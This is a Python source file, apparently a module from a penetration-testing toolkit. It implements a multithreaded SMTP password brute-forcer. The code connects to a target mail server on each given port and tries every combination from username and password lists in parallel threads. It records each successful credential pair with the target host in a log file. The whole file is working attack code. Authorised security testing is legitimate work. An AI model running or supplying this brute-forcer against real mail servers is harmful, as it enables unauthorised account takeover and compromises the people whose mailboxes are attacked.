#!/usr/bin/env python
import threading
import time
import smtplib
from core.alert import *

def login(user, passwd,target,port,timeout_sec,log_in_file):
    exit = 0
    while 1:
        try:
            if timeout_sec is not None:
                server = smtplib.SMTP(target, int(port),timeout=timeout_sec)
            else:
                server = smtplib.SMTP(target, int(port))
            server.starttls()
            exit = 0
            break
        except:
            exit += 1
            if exit is 10:
                warn('smtp connection to %s:%s timeout, skipping %s:%s'%(target,port,user,passwd))
                return 1
            time.sleep(0.1)
    flag = 1
    try:
        server.login(user, passwd)
        flag = 0
    except smtplib.SMTPException, err:
        pass
    if flag is 0:
        info('user:' + user + ' pass:' + passwd + ' server:' + target + ' port:' + str(port) + ' found!')
        save = open(log_in_file, 'a')
        save.write('smtp ---> ' + user + ':' + passwd + ' ---> ' + target + ':' + str(port) + '\n')
        save.close()
    else:
        pass
    server.quit()
    return flag

def start(target,users,passwds,ports,timeout_sec,thread_number,num,total,log_in_file): # Main function
    threads = []
    max = thread_number
    total_req = len(users) * len(passwds)
    for port in ports:
        # test smtp
        trying = 0
        portflag = True
        exit = 0
        while 1:
            try:
                if timeout_sec is not None:
                    server = smtplib.SMTP(target, int(port), timeout=timeout_sec)
                else:
                    server = smtplib.SMTP(target, int(port))
                server.starttls()
                server.quit()
                exit = 0
                break
            except:
                exit += 1
                if exit is 3:
                    error(
                        'smtp connection to %s:%s failed, skipping whole step [process %s of %s]! going to next step' % (
                        target, port, str(num), str(total)))
                    portflag = False
                    break
                time.sleep(0.1)

        if portflag is True:
            for user in users:
                for passwd in passwds:
                    t = threading.Thread(target=login, args=(user, passwd,target,port,timeout_sec,log_in_file))
                    threads.append(t)
                    t.start()
                    trying += 1
                    info('trying ' + str(trying) + ' of ' + str(total_req) + ' in process ' + str(num) + ' of ' + str(
                        total) + ' ' + target + ':' + str(port))
                    while 1:
                        n = 0
                        for thread in threads:
                            if thread.isAlive() is True:
                                n += 1
                            else:
                                threads.remove(thread)
                        if n >= max:
                            time.sleep(0.1)
                        else:
                            break

    # wait for threads
    while 1:
        n = True
        for thread in threads:
            if thread.isAlive() is True:
                n = False
        time.sleep(0.1)
        if n is True:
            break